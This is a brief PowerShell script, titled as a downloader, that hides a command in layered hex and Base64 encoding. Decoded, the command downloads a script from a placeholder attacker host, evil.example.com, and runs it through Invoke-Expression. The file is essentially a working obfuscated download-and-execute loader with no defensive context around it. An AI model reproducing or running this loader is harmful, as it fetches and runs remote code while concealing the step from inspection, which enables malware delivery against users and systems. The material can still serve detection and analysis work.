# Hex -> Base64 -> Powershell downloader

$InputString = "535556594943684f5a58637454324a715a574e304945356c644335585a574a4462476c6c626e51704c6b5276643235736232466b553352796157356e4b43646f644852774f6938765a585a706243356c654746746347786c4c6d4e766253397759586c736232466b4c6e427a4d543978505445794d7a51314e6a63344f54416e4b513d3d"

$hexBytes = [byte[]]::new($InputString.Length / 2)
for ($i = 0; $i -lt $hexBytes.Length; $i++) {
    $hexBytes[$i] = [Convert]::ToByte($InputString.Substring($i * 2, 2), 16)
}
$base64String = [System.Text.Encoding]::UTF8.GetString($hexBytes)
$finalBytes = [System.Convert]::FromBase64String($base64String)
$decodedScript = [System.Text.Encoding]::UTF8.GetString($finalBytes)
Invoke-Expression -Command $decodedScript
